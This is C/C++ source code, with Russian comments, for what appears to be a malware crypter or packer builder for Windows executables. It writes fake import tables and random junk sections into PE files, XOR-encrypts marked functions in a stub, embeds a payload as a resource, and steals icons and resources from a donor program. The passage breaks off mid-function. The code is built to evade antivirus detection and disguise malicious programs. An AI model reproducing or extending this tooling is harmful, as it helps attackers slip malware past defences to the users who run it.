	whatever DLLNAMES[] = {	{ "KERNEL32.dll", 0 }, 	{ "USER32.dll", 0 }, 	{ "GDI32.dll", 0 }, 	{ "OLE32.dll", 0 }, 	{ "COMDLG32.dll", 0 }, 	{ "OLEAUT32.dll", 0 },	{ "SHELL32.dll", 0 }};
	
	DWORD Align(DWORD dwValue, DWORD dwAlignment)//Returns dwValue aligned to the next multiple of dwAlignment//dwAlignment cannot be 0
	{
		if (dwAlignment && dwValue % dwAlignment)		return (dwValue + dwAlignment) - (dwValue % dwAlignment);	else		return dwValue;
	}
//------------------------------------------------------------------------------------------------
	LPVOID FakeImports(DWORD dwImportDataRVA, DWORD *dwOutSize, DWORD *dwIATSize, DWORD* dwImportsSize)//makes a fake import section. probably useless. sounded good when i was high.
	{	
		DWORD dwTotalNames = 0, dwTotalLibs, we, *Names, *Functions, x;	
		WORD i, *Ordinals;	
		HMODULE hLib;	
		LPVOID pBuffer;	
		PIMAGE_THUNK_DATA pFirstThunks, pOriginalThunks;	
		PIMAGE_IMPORT_DESCRIPTOR pImports;	
		PIMAGE_IMPORT_BY_NAME pNamesStart, pNamesPtr, iter;	
		PIMAGE_EXPORT_DIRECTORY pExports;	//picks 2 to 5 entries from dllnames.	
		//randomly picks 10 to 20 (different) names from each entry	
		pBuffer = VirtualAlloc(NULL, *dwOutSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);	
		dwTotalLibs = 2 + (rand() % 4);	
		we = dwTotalLibs;	
		while (we--)	
		{		
			x = 0;		
			do
			{
				i = rand() % (sizeof(DLLNAMES) / sizeof(whatever));	
			} while (DLLNAMES[i].UsedAlready && ++x < 1000);		
			if (x == 1000)			break;		
			DLLNAMES[i].UsedAlready = 10 + (rand() % 10);		
			dwTotalNames += DLLNAMES[i].UsedAlready;	
		}	
		if (we != (DWORD)-1 && we)		dwTotalLibs = we;	
		*dwIATSize = sizeof(IMAGE_THUNK_DATA) * (dwTotalNames + dwTotalLibs);	
		pFirstThunks = (PIMAGE_THUNK_DATA)pBuffer;	
		pImports = (PIMAGE_IMPORT_DESCRIPTOR)((char*)pFirstThunks + *dwIATSize);	
		pOriginalThunks = (PIMAGE_THUNK_DATA)((char*)pImports + (sizeof(IMAGE_IMPORT_DESCRIPTOR) * (dwTotalLibs + 1)));	
		pNamesStart = (PIMAGE_IMPORT_BY_NAME)Align(((DWORD)pOriginalThunks + *dwIATSize), 2);	
		we = dwTotalLibs;	
		while (we--)	
		{
			x = 0;		
			do		
			{
				i = rand() % (sizeof(DLLNAMES) / sizeof(whatever));		
			} while (!DLLNAMES[i].UsedAlready && ++x < 1000);	
			if (x == 1000)			break;
			hLib = LoadLibrary(DLLNAMES[i].szName);		
			if (hLib)		
			{			
				pExports = (PIMAGE_EXPORT_DIRECTORY)((DWORD)hLib + ((PIMAGE_NT_HEADERS)((DWORD)hLib + ((PIMAGE_DOS_HEADER)hLib)->e_lfanew))->OptionalHeader.DataDirectory[0].VirtualAddress);			
				if (pExports != (PIMAGE_EXPORT_DIRECTORY)hLib && pExports->NumberOfNames)			
				{
					//write name, import descriptor				
					lstrcpy((LPTSTR)pNamesStart->Name, DLLNAMES[i].szName);				
					pImports->FirstThunk = dwImportDataRVA + ((DWORD)pFirstThunks - (DWORD)pBuffer);
					pImports->Name = dwImportDataRVA + ((DWORD)pNamesStart->Name - (DWORD)pBuffer);
					pImports->OriginalFirstThunk = dwImportDataRVA + ((DWORD)pOriginalThunks - (DWORD)pBuffer);
					pNamesPtr = (PIMAGE_IMPORT_BY_NAME)Align(((DWORD)pNamesStart + 2 + lstrlen(DLLNAMES[i].szName) + 1), 2);				
					Names = (DWORD*)((DWORD)hLib + pExports->AddressOfNames);				
					Ordinals = (WORD*)((DWORD)hLib + pExports->AddressOfNameOrdinals);				
					Functions = (DWORD*)((DWORD)hLib + pExports->AddressOfFunctions);				
					//write thunks				
					//pick a random # (DLLNAMES[i].UsedAlready) of named api. (i assume hint in thunk data is supposed to be ordinals[x] value, but i have no idea really.)				
					do				
					{					
						x = rand() % pExports->NumberOfNames;					
						for (iter = pNamesStart; iter < pNamesPtr; iter = (PIMAGE_IMPORT_BY_NAME)Align(((DWORD)iter + 2 + lstrlen((LPCTSTR)iter->Name) + 1), 2))					
						{						
							if (iter->Hint == Ordinals[x])						
							{							
								x = (WORD)-1;							
								break;						
							}					
						}					
						if (x == (WORD)-1)					
						{						
							DLLNAMES[i].UsedAlready++;						
							continue;					
						}					
						pNamesPtr->Hint = Ordinals[x];					
						lstrcpy((LPTSTR)pNamesPtr->Name, (LPCTSTR)hLib + Names[x]);					
						pFirstThunks->u1.AddressOfData = dwImportDataRVA + ((DWORD)pNamesPtr - (DWORD)pBuffer);					
						*pOriginalThunks++ = *pFirstThunks++;					
						pNamesPtr = (PIMAGE_IMPORT_BY_NAME)Align(((DWORD)pNamesPtr + 2 + lstrlen((LPCTSTR)pNamesPtr->Name) + 1), 2);				
					} while (--DLLNAMES[i].UsedAlready);				
					pFirstThunks++;				
					pOriginalThunks++;				
					for (iter = pNamesStart; iter < pNamesPtr; iter = (PIMAGE_IMPORT_BY_NAME)Align(((DWORD)iter + 2 + lstrlen((LPCTSTR)iter->Name) + 1), 2))				
					{					
						iter->Hint = 0;				
					}				
					pImports++;				
					pNamesStart = pNamesPtr;			
				}		
			}		DLLNAMES[i].UsedAlready = 0;	
		}	
		*dwOutSize = (DWORD)pNamesPtr - (DWORD)pBuffer;	
		*dwImportsSize = *dwOutSize - *dwIATSize;	return pBuffer;
	}
	//----------------------------------------------------------------------------------------------------------------------
	bool AddSectionFakeImport(char *szFileName, char* szImportSectionName)
	{	
		HANDLE hFile = CreateFile(szFileName,GENERIC_READ|GENERIC_WRITE,0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
		if (hFile == INVALID_HANDLE_VALUE) return FALSE;	
		DWORD dwFileSize = GetFileSize(hFile,NULL);	
		BYTE *pByte = new BYTE[dwFileSize];	
		LPVOID pImportData;	
		DWORD dwImportRawSize, dwIATSize, dwImportsSize;	
		DWORD dwUseLess;	
		ReadFile(hFile,pByte,dwFileSize,&dwUseLess,NULL);	
		IMAGE_DOS_HEADER *pDosHeader = (IMAGE_DOS_HEADER*)pByte;	
		IMAGE_FILE_HEADER *pFileHeader = (IMAGE_FILE_HEADER*)(pByte + pDosHeader->e_lfanew + sizeof(DWORD));
		IMAGE_OPTIONAL_HEADER *pOptionalHeader = (IMAGE_OPTIONAL_HEADER*)(pByte + pDosHeader->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER));	
		IMAGE_SECTION_HEADER *pSectionHeader = (IMAGE_SECTION_HEADER*)(pByte + pDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS));	
		dwImportRawSize = 10240;	
		ZeroMemory(&pSectionHeader[pFileHeader->NumberOfSections],sizeof(IMAGE_SECTION_HEADER));	
		CopyMemory(&pSectionHeader[pFileHeader->NumberOfSections].Name,szImportSectionName,strlen(szImportSectionName));	
		pSectionHeader[pFileHeader->NumberOfSections].Misc.VirtualSize = round(dwImportRawSize,pOptionalHeader->SectionAlignment,0);	
		pSectionHeader[pFileHeader->NumberOfSections].VirtualAddress = round(pSectionHeader[pFileHeader->NumberOfSections-1].Misc.VirtualSize,pOptionalHeader->SectionAlignment,pSectionHeader[pFileHeader->NumberOfSections - 1].VirtualAddress);	
		pImportData = FakeImports(pSectionHeader[pFileHeader->NumberOfSections].VirtualAddress, &dwImportRawSize, &dwIATSize, &dwImportsSize);	
		pSectionHeader[pFileHeader->NumberOfSections].SizeOfRawData = round(dwImportRawSize,pOptionalHeader->FileAlignment,0);	
		pSectionHeader[pFileHeader->NumberOfSections].PointerToRawData = round(pSectionHeader[pFileHeader->NumberOfSections - 1].SizeOfRawData,pOptionalHeader->FileAlignment,pSectionHeader[pFileHeader->NumberOfSections - 1].PointerToRawData);	
		pSectionHeader[pFileHeader->NumberOfSections].Characteristics = 0x40000040;	
		SetFilePointer(hFile,pSectionHeader[pFileHeader->NumberOfSections].PointerToRawData + pSectionHeader[pFileHeader->NumberOfSections].SizeOfRawData ,NULL,FILE_BEGIN);	
		pOptionalHeader->SizeOfImage = pSectionHeader[pFileHeader->NumberOfSections].VirtualAddress + pSectionHeader[pFileHeader->NumberOfSections].Misc.VirtualSize;	
		SetFilePointer(hFile, pSectionHeader[6].PointerToRawData, NULL, FILE_BEGIN);	
		WriteFile(hFile, pImportData, dwImportRawSize, &dwUseLess, NULL);	
		VirtualFree(pImportData, 0, MEM_RELEASE);	
		SetFilePointer(hFile,0,NULL,FILE_BEGIN);	
		WriteFile(hFile,pByte,dwFileSize,&dwUseLess,NULL);	
		SetEndOfFile(hFile);	
		CloseHandle(hFile);
	}
	/********************************************************************************************
	/Расчёт MD5 - Хэша буфера*/
	BOOL MD5(IN char* sz_inbuf,DWORD dw_bufsize,OUT char* sz_outbuf)
	{
		typedef struct _MD5_CTX
		{
			ULONG         i[2];
			ULONG         buf[4];
			unsigned char in[64];
			unsigned char digest[16];
		} MD5_CTX,*PMD5_CTX;
		typedef void (WINAPI *MD5INIT)(MD5_CTX*);
		typedef void (WINAPI *MD5UPDATE)(MD5_CTX*, unsigned char* input, unsigned int inlen);
		typedef void (WINAPI *MD5FINAL)(MD5_CTX*);
		MD5INIT MD5Init;
		MD5UPDATE MD5Update;
		MD5FINAL MD5Final;
		MD5_CTX md5Ctx={0};
		char szHex[] ="0123456789ABCDEF";
		char szMD5[36] ={0};
		RtlZeroMemory(szMD5,sizeof(szMD5));
		//HMODULE hLib = LoadLibrary("cryptdll.Dll");
		HMODULE hLib = LoadLibrary("advapi32.Dll");
		//If the handle is valid try to get function address
		if (hLib != NULL) 
		{
			MD5Init = (MD5INIT)GetProcAddress(hLib, ("MD5Init"));
			MD5Update = (MD5UPDATE)GetProcAddress(hLib, ("MD5Update"));
			MD5Final = (MD5FINAL)GetProcAddress(hLib, ("MD5Final"));
			//If the function address is valid try call function
			if (MD5Init != NULL) 
			{
				MD5Init(&md5Ctx);
				MD5Update(&md5Ctx, (BYTE*)sz_inbuf,dw_bufsize);
				MD5Final(&md5Ctx);
				int nOfs=0;
				for (int nC = 0; nC < 16; nC++) 
				{
					nOfs = nC*2;
					szMD5[nOfs] = szHex[(md5Ctx.digest[nC]&0xF0)>>4];
					szMD5[nOfs+1] = szHex[md5Ctx.digest[nC]&0x0F];
				}
				szMD5[nOfs+2] = 0;
				strcpy(sz_outbuf,szMD5);
				return TRUE;
			}
			FreeLibrary(hLib);
		}
		return FALSE;
	}

	/********************************************************************************************
	/Добавление мусорных секций*/
	BOOL FakeSection(PCHAR sz_fnam, BYTE bRnd)
	{
		BYTE j;
		UINT i;
		for(j=0;j<bRnd;j++)
		{
			DWORD dw_rndlen;
			BYTE* b_rndbuf;
			dw_rndlen=(DWORD)(rand() % (j*MAXDWORD-1));
			b_rndbuf=(BYTE*)GlobalAlloc(GMEM_ZEROINIT,dw_rndlen);
			for(i=0;i<dw_rndlen;i++)
			{
				b_rndbuf[i]=xor128(0,BYTE(rand() % 255 + 1));
			}
			PEFILE PEf;
			if(OpenPEFile(sz_fnam,&PEf))
			{
				char sz_secname[10]={0};
				DWORD dwD;
				sprintf(sz_secname,".%s",rnddstr(1,7,&dwD));
				AddSection(&PEf,sz_secname,IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_CNT_INITIALIZED_DATA,b_rndbuf,dw_rndlen);
			}
			ClosePEFile(&PEf);
			GlobalFree(b_rndbuf);
		}
		return TRUE;
	}
/********************************************************************************************
/Универсально: Запись в выходной файл "начинки" в ресурс*/
BOOL AddRes(IN PCHAR sz_file,IN PBYTE lpBuf,IN DWORD dwResSize,IN LPSTR sz_restype,IN LPSTR sz_resnum)
{
	HANDLE hUpdate = BeginUpdateResource(sz_file, FALSE);
	if(hUpdate==NULL) __ERR("AddRes: BeginUpdateResource");
	if(UpdateResource(hUpdate,sz_restype, sz_resnum, MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),lpBuf, dwResSize) == FALSE) __ERR("AddRes: UpdateResource");
	if(EndUpdateResource(hUpdate, FALSE) == FALSE) __ERR("AddRes: EndUpdateResource");
	CloseHandle(hUpdate);
	return TRUE;
}
//*******************************************************************************************
//Добавление файла-иконки 
BOOL AddIcon(IN LPSTR szIconFile,IN LPSTR szPEFile)
{
	int i=0;
	HANDLE hFile = CreateFile(szIconFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	LPICONDIR lpid;
	lpid = (LPICONDIR)malloc(sizeof(ICONDIR));
	if(lpid == NULL)
	{
		return FALSE;
	}
	DWORD dwBytesRead;
	ReadFile(hFile, &lpid->idReserved, sizeof(WORD), &dwBytesRead, NULL);
	ReadFile(hFile, &lpid->idType, sizeof(WORD), &dwBytesRead, NULL);
	ReadFile(hFile, &lpid->idCount, sizeof(WORD), &dwBytesRead, NULL);
	lpid = (LPICONDIR)realloc(lpid, (sizeof(WORD) * 3) + (sizeof(ICONDIRENTRY) * lpid->idCount));
	if(lpid == NULL)
	{
		return FALSE;
	}
	ReadFile(hFile, &lpid->idEntries[0], sizeof(ICONDIRENTRY) * lpid->idCount, &dwBytesRead, NULL);
	LPGRPICONDIR lpgid;
	lpgid = (LPGRPICONDIR)malloc(sizeof(GRPICONDIR));
	if(lpgid == NULL)
	{
		return FALSE;
	}
	lpgid->idReserved = lpid->idReserved;
	lpgid->idType = lpid->idType;
	lpgid->idCount = lpid->idCount;
	lpgid = (LPGRPICONDIR)realloc(lpgid, (sizeof(WORD) * 3) + (sizeof(GRPICONDIRENTRY) * lpgid->idCount));
	if(lpgid == NULL)
	{
		return FALSE;
	}
	for(int i = 0; i < lpgid->idCount; i++)
	{
		lpgid->idEntries[i].bWidth = lpid->idEntries[i].bWidth;
		lpgid->idEntries[i].bHeight = lpid->idEntries[i].bHeight;
		lpgid->idEntries[i].bColorCount = lpid->idEntries[i].bColorCount;
		lpgid->idEntries[i].bReserved = lpid->idEntries[i].bReserved;
		lpgid->idEntries[i].wPlanes = lpid->idEntries[i].wPlanes;
		lpgid->idEntries[i].wBitCount = lpid->idEntries[i].wBitCount;
		lpgid->idEntries[i].dwBytesInRes = lpid->idEntries[i].dwBytesInRes;
		lpgid->idEntries[i].nID = i + 1;
	}
	HANDLE hUpdate=NULL;
	hUpdate = BeginUpdateResource(szPEFile,FALSE);
	if(hUpdate == NULL)
	{
		CloseHandle(hFile);
		return FALSE;
	}
	for(i = 0; i < lpid->idCount; i++)
	{
		LPBYTE lpBuffer = (LPBYTE)malloc(lpid->idEntries[i].dwBytesInRes);
		if(lpBuffer == NULL)
		{
			CloseHandle(hFile);
			return FALSE;
		}
		SetFilePointer(hFile, lpid->idEntries[i].dwImageOffset, NULL, FILE_BEGIN);
		ReadFile(hFile, lpBuffer, lpid->idEntries[i].dwBytesInRes, &dwBytesRead, NULL);
		if(UpdateResource(hUpdate, RT_ICON, MAKEINTRESOURCE(lpgid->idEntries[i].nID), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), &lpBuffer[0], lpid->idEntries[i].dwBytesInRes) == FALSE)
		{
			CloseHandle(hFile);
			free(lpBuffer);
			return FALSE;
		}
		free(lpBuffer);
	}
	CloseHandle(hFile);
	if(UpdateResource(hUpdate, RT_GROUP_ICON, MAKEINTRESOURCE(1), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), &lpgid[0], (sizeof(WORD) * 3) + (sizeof(GRPICONDIRENTRY) * lpgid->idCount)) == FALSE)
	{
		return FALSE;
	}
	if(EndUpdateResource(hUpdate, FALSE) == FALSE)
	{
		return FALSE;
	}
	return TRUE;
}
//**********************************************************************************************
DWORD CalcRealHeaderSize (PIMAGE_NT_HEADERS pNT)
{
	DWORD                  dwHSize;
	UINT                   i;
	IMAGE_SECTION_HEADER   *pS;

	if (!pNT->FileHeader.NumberOfSections) return ((PIMAGE_NT_HEADERS32) pNT) ->OptionalHeader.SizeOfHeaders;

	dwHSize = 0xFFFFFFFF;
	pS = IMAGE_FIRST_SECTION (pNT);
	for (i = 0; i < pNT->FileHeader.NumberOfSections; i++)
	{
		if (pS->PointerToRawData) dwHSize = MIN (dwHSize, pS->PointerToRawData);
		++pS;
	}
	// Fix
	return (dwHSize > 0x00001000) ? 0x00001000 : dwHSize;
}
//*********************************************************************************************
USHORT ChkSum(ULONG PartialSum,
	PUSHORT Source,
	ULONG Length)
{
	while (Length--) 
	{
		PartialSum += *Source++;
		PartialSum = (PartialSum >> 16) + (PartialSum & 0xffff);
	}

	return (USHORT)(((PartialSum >> 16) + PartialSum) & 0xffff);
}
//---------------------------------------------------------------------------------------------
ULONG CalcCheckSum(PVOID BaseAddress, ULONG FileLength)
{
	PUSHORT AdjustSum;
	PIMAGE_NT_HEADERS NtHeaders;
	USHORT PartialSum;
	ULONG HeaderSum;
	ULONG CheckSum;

	HeaderSum = 0;
	PartialSum = ChkSum(0, (PUSHORT)BaseAddress, (FileLength + 1) >> 1);

	NtHeaders = PIMAGE_NT_HEADERS(PCHAR(BaseAddress) + PIMAGE_DOS_HEADER(BaseAddress)->e_lfanew);

	if (NtHeaders != NULL) 
	{
		HeaderSum = NtHeaders->OptionalHeader.CheckSum;

		AdjustSum = (PUSHORT)(&NtHeaders->OptionalHeader.CheckSum);
		PartialSum -= (PartialSum < AdjustSum[0]);
		PartialSum -= AdjustSum[0];
		PartialSum -= (PartialSum < AdjustSum[1]);
		PartialSum -= AdjustSum[1];
	} 
	else 
	{
		PartialSum = 0;
		HeaderSum = FileLength;
	}

	CheckSum = (ULONG)PartialSum + FileLength;

	return CheckSum;
}
//*******************************************************************************************
BOOL FileExist(LPCSTR sz_f)
{
	WIN32_FIND_DATA WFD;
	HANDLE hFFile;
	hFFile=FindFirstFile(sz_f, &WFD);
	if (INVALID_HANDLE_VALUE==hFFile) return FALSE;
	FindClose(hFFile);
	return TRUE;
}
//===========================================================================================
//BOOL ExtractIconsFromResource( char* psResource )
//{
//	IMAGE_RESOURCE_DIRECTORY *Dir;
//	IMAGE_RESOURCE_DIRECTORY_ENTRY *Entry;
//
//	Dir = ( IMAGE_RESOURCE_DIRECTORY* )psResource;//root dir
//
//	Entry = ( IMAGE_RESOURCE_DIRECTORY_ENTRY* )( Dir + 1 );//first entry in root dir
//
//	int nCount = Dir->NumberOfIdEntries + Dir->NumberOfNamedEntries;
//	int i;
//
//	IMAGE_RESOURCE_DIRECTORY_ENTRY* pEntries[100];
//	int nEntries = 0;
//
//	//cycle on root dir entries
//	for( i = 0; i < nCount; i++ )
//	{
//		if( Entry->Id == 0x0e ) //icon group subdir
//		{
//			Dir = ( IMAGE_RESOURCE_DIRECTORY* )( psResource + Entry->OffsetToDirectory);
//			nCount = Dir->NumberOfIdEntries + Dir->NumberOfNamedEntries;
//
//			//scan icons dir
//			// each entry points to subdirectory
//			Entry = ( IMAGE_RESOURCE_DIRECTORY_ENTRY* )( Dir + 1 );
//			for( i = 0; i < nCount; i ++ )
//			{
//				pEntries[ i ] = new IMAGE_RESOURCE_DIRECTORY_ENTRY;
//				memcpy( pEntries[ i ], Entry, sizeof( IMAGE_RESOURCE_DIRECTORY_ENTRY ) );
//				Entry++;
//			}
//
//			//gather icons data
//			int j;
//			int nIcons;
//			IMAGE_RESOURCE_DATA_ENTRY* pData;
//			for( i = 0; i < nCount; i ++ )
//			{    
//				//enter subdir
//				Dir = ( IMAGE_RESOURCE_DIRECTORY* )( psResource + pEntries[ i ]->OffsetToDirectory );
//
//				//scan each icon subdir
//				Entry = ( IMAGE_RESOURCE_DIRECTORY_ENTRY* )( Dir + 1 );
//
//				//get data entry
//				pData = ( IMAGE_RESOURCE_DATA_ENTRY* )( psResource + Entry->OffsetToData );
//			}
//			break;
//		}
//		Entry++;
//	}
//	delete[] pEntries;
//	return( TRUE );
//}
//*******************************************************************************************
//Шифратор помеченных функций в стабе
//На выходе - число пошифр. ф-ций
//Всего 10 ф-ций шифруется. У каждой оригинальные метки,
//для последующей расшифровки по мере необходимости
BYTE FunCript(IN PBYTE lpBuffer,IN DWORD dwSz)
{
	BYTE Fcnt=0; //Счётчик ф-ций
	char a[255];
	//Метки Start (на край 16 шт):
	DWORD fix=0xD0C0B0A0,bcnt=0;
	//DWORD lbSTART[]={0xD0C0B0A0,0xD1C1B1A1,0xD2C2B2A2,0xD3C3B3A3,0xD4C4B4A4,0xD5C5B5A5,0xD6C6B6A6,0xD7C7B7A7,0xD8C8B8A8,0xD9C9B9A9,0xDACABAAA,0xDBCBBBAB,0xDCCCBCAC,0xDDCDBDAD,0xDECEBEAE,0xDFCFBFAF};
	//Находим метку начала нужной ф-ции {0xAF;0xBF;0xCF;0xDF}=DWORD {DF,CF,BF,AF}
	//Метки конца у всех одни и те же
	for(DWORD i=0;i<dwSz;i++)
	{
		for(BYTE z=0;z<16;z++)
		{
			bcnt=0;
			if(*((DWORD*)(lpBuffer+i))==fix+z)//lbSTART[z])//0xDFCFBFAF)
			{
				//MessageBoxA(NULL,"START FOUND",0,0);
				//*((DWORD*)(lpBuffer+i))=0xDECEBEAE;
				i+=4;
				BYTE k=0x30+z;
				for(DWORD j=0;j<dwSz-i-4;j++)
				{
					bcnt++;
					if(*((DWORD*)(lpBuffer+i+j))==0xAFBFCFDF) 
					{
						//MessageBoxA(NULL,"END FOUND",0,0);
						Fcnt++;
						break;
					}
					BYTE tmp=lpBuffer[i+j];
					lpBuffer[i+j]=tmp^k;
				}
				break;
			}
		}
	}
	return Fcnt;
}
//===========================================================================================
//===========================================================================================
//#define addr_t LPVOID
//#define uint16_t int
//static const IMAGE_RESOURCE_DIRECTORY_ENTRY* ResFindItem(addr_t base, 
//    const IMAGE_RESOURCE_DIRECTORY* dir, const uint16_t* ids)
//{
//    const IMAGE_RESOURCE_DIRECTORY_ENTRY *entry;
//    int i;
//
//    entry = (const IMAGE_RESOURCE_DIRECTORY_ENTRY*) (dir + 1);
//    for (i = 0; i < dir->NumberOfNamedEntries + dir->NumberOfIdEntries; i++)
//    {
//        if (entry[i].Id == ids[0] || ids[0] == 0)
//        {
//            ids++;
//            if (entry[i].DataIsDirectory)
//            {
//                /*wprintf(L"%x: Directory: offset to directory = %x\n", 
//                    entry[i].u.Id, entry[i].u2.s.OffsetToDirectory);*/
//                dir = (const IMAGE_RESOURCE_DIRECTORY*) (base + entry[i].u2.s.OffsetToDirectory);
//                return ResFindItem(base, dir, ids);
//            }
//            else
//            {
//                /*wprintf(L"%x: Resource: offset to data = %x\n", 
//                    entry[i].u.Id, entry[i].u2.OffsetToData);*/
//                return entry + i;
//            }
//        }
//    }
//
//    /*wprintf(L"%x: Not found\n", ids[0]);*/
//    errno = ENOTFOUND;
//    return NULL;
//}
//  
////! Finds a resource in the specified module.
///*!
// *    \param    base    The base address of the module where the resource is to be 
// *        found. Use _info.base for the current module, or another base address if 
// *        a different module is to be used.
// *
// *    \param    type    A pre-defined or numeric user-defined resource type.
// *    Pre-defined resource types are:
// *    - RT_CURSOR        A cursor at a specific resolution and colour depth
// *    - RT_BITMAP        A bitmap
// *    - RT_ICON        An icon at a specific resolution and colour depth
// *    - RT_MENU        A menu definition
// *    - RT_DIALOG        A dialog box definition
// *    - RT_STRING        A block of up to 16 strings (use resLoadString() to load a 
// *        specific string)
// *    - RT_FONTDIR    A list of fonts
// *    - RT_FONT        A font with a specific typeface, weight, size and attributes
// *    - RT_ACCEL        A list of keyboard accelerators
// *    - RT_RCDATA        Arbitrary binary data
// *    - RT_MSGTABLE    A table of error messages
// *    - RT_GROUP_CURSOR    A group of cursors which describe the same image but at
// *        different resolutions and colour depths
// *    - RT_GROUP_ICON    A group of icons which describe the same image but at
// *        different resolutions and colour depths
// *    - RT_VERSION    A version information block
// *    \param    id        The numeric identifier of the resource to be loaded.
// *    \param    language    The ID of the specific language of the resource to
// *        be loaded. Passing NULL for this parameter specifies the default 
// *        language for the process.
// *
// *    \note The M�bius only supports numeric resource IDs; string IDs (such
// *        as those used in Microsoft Windows) are not supported.
// *
// *    \return    A pointer to the start of the resource within the specified module,
// *        or NULL if the resource could not be found.
// *        Since the resource is contained within the image of the module in 
// *        memory, it is read-only (or it conforms to the attributes of the 
// *        PE section that contains it). There is also no corresponding function
// *        to free a loaded resource; all resources are freed when the process
// *        terminates.
// */
//const void* ResFindResource(addr_t base, uint16_t type, uint16_t id, uint16_t language)
//{
//    uint16_t ids[4] = { type, id, language, 0 };
//    const IMAGE_DOS_HEADER* dos_head;
//    const IMAGE_PE_HEADERS* header;
//    const IMAGE_RESOURCE_DIRECTORY *dir;
//    const IMAGE_RESOURCE_DIRECTORY_ENTRY *entry;
//    const IMAGE_RESOURCE_DATA_ENTRY *data;
//    
//    if (base == NULL)
//        base = ProcGetExeBase();
//
//    dos_head = (const IMAGE_DOS_HEADER*) base;
//    header = (const IMAGE_PE_HEADERS*) ((char *) dos_head + dos_head->e_lfanew);
//    dir = (const IMAGE_RESOURCE_DIRECTORY*) 
//        (base + header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress);
//
//    if ((addr_t) dir <= base)
//    {
//        errno = ENOTFOUND;
//        return NULL;
//    }
//
//    entry = ResFindItem((addr_t) dir, dir, ids);
//    if (entry)
//    {
//        /*wprintf(L"entry->OffsetToData = %x\n", entry->OffsetToData);*/
//        data = (const IMAGE_RESOURCE_DATA_ENTRY*) ((uint8_t*) dir + entry->u2.OffsetToData);
//        /*wprintf(L"data->OffsetToData = %x\n", data->OffsetToData);*/
//        return (const void*) (base + data->OffsetToData);
//    }
//    else
//        return NULL;
//}
//
//size_t ResSizeOfResource(addr_t base, uint16_t type, uint16_t id, uint16_t language)
//{
//    uint16_t ids[4] = { type, id, language, 0 };
//    const IMAGE_DOS_HEADER* dos_head;
//    const IMAGE_PE_HEADERS* header;
//    const IMAGE_RESOURCE_DIRECTORY *dir;
//    const IMAGE_RESOURCE_DIRECTORY_ENTRY *entry;
//    const IMAGE_RESOURCE_DATA_ENTRY *data;
//    
//    if (base == NULL)
//        base = ProcGetExeBase();
//
//    dos_head = (const IMAGE_DOS_HEADER*) base;
//    header = (const IMAGE_PE_HEADERS*) ((char *) dos_head + dos_head->e_lfanew);
//    dir = (const IMAGE_RESOURCE_DIRECTORY*) 
//        (base + header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress);
//
//    if ((addr_t) dir <= base)
//    {
//        errno = ENOTFOUND;
//        return -1;
//    }
//
//    entry = ResFindItem((addr_t) dir, dir, ids);
//    if (entry)
//    {
//        /*wprintf(L"entry->OffsetToData = %x\n", entry->OffsetToData);*/
//        data = (const IMAGE_RESOURCE_DATA_ENTRY*) ((uint8_t*) dir + entry->u2.OffsetToData);
//        /*wprintf(L"data->OffsetToData = %x\n", data->OffsetToData);*/
//        return data->Size;
//    }
//    else
//        return -1;
//}
//
////! Loads a string from the specified module.
///*!
// *    \param    base    The base address of the module where the resource is to be 
// *        found. Use _info.base for the current module, or another base address if 
// *        a different module is to be used.
// *    \param    id        The numeric identifier of the string to be loaded.
// *    \param    str        String buffer to receive the loaded string.
// *    \param    str_max    Size, in characters, of the buffer pointed to by str.
// *
// *    \return    \p true if the string was found and loaded successfully; false 
// *        otherwise.
// *    \note    Due to a limitation of the PE resource file format, it is not 
// *        possible to distinguish between a zero-length string and a not-present
// *        string if there are any strings within the same block of 16.
// */
//bool ResLoadString(addr_t base, uint16_t id, wchar_t* str, size_t str_max)
//{
//    const wchar_t* buf;
//    uint16_t i;
//
//    buf = ResFindResource(base, RT_STRING, (uint16_t) ((id >> 4) + 1), 0);
//    if (buf != NULL)
//    {
//        id &= 15;
//
//        for (i = 0; i < id; i++)
//            buf += buf[0] + 1;
//
//        wcsncpy(str, buf + 1, min((uint16_t) buf[0], str_max));
//        return true;
//    }
//    else
//        return false;
//}
//
//size_t ResGetStringLength(addr_t base, uint16_t id)
//{
//    const wchar_t* buf;
//    uint16_t i;
//
//    buf = ResFindResource(base, RT_STRING, (uint16_t) ((id >> 4) + 1), 0);
//    if (buf != NULL)
//    {
//        id &= 15;
//
//        for (i = 0; i < id; i++)
//            buf += buf[0] + 1;
//
//        return buf[0];
//    }
//    else
//        return 0;
//}

//------------------------------------------------------------------------------------------------
void Trans(LPCSTR szTarget, LPCSTR szDonor, LPCSTR szType)
{
	int i;
	HRSRC hResLoad;     // дескриптор загружаемого ресурса
	HMODULE hExe;        // дескриптор существующего .EXE файла
	HRSRC hRes,hResIco;         // дескриптор/указатель на информ. о ресурсе в hExe 
	HANDLE hUpdateRes;  // дескриптор корректировки ресурса 
	char *lpResLock;    // указатель на данные ресурса 
	BOOL result; 
	DWORD dwResSize;
	// Загрузка .EXE файла, содержащего блок диалога,
	// который вы хотите скопировать. 
	hExe = LoadLibrary(szDonor); 
	if (hExe == NULL) 
	{ 
		printf("Could not load exe.\n");
		return;
	} 

	// Определяем местонахождение ресурса диалогового окна
	// в .EXE файле. 
	for(i=0;i<=256;i++)
	{
		hRes = FindResource(hExe,MAKEINTRESOURCE(i), szType); 
		if(hRes!=NULL)
		{
			dwResSize = SizeofResource(hExe, hRes);
			if(dwResSize>0)
			{
				printf("Found: %d, size: %d\n",i,dwResSize);
				break;
			}
		}
	}
	if(i==256) {FreeLibrary(hExe);return;}
	printf("Size Resource: %d\n",dwResSize);
	// Загружаем в глобальную память. 
	hResLoad = (HRSRC)LoadResource(hExe, hRes); 
	if (hResLoad == NULL) 
	{ 
		if(szType==RT_ICON)
		{
			// Открываем файл чтоб удалить исходную иконку 
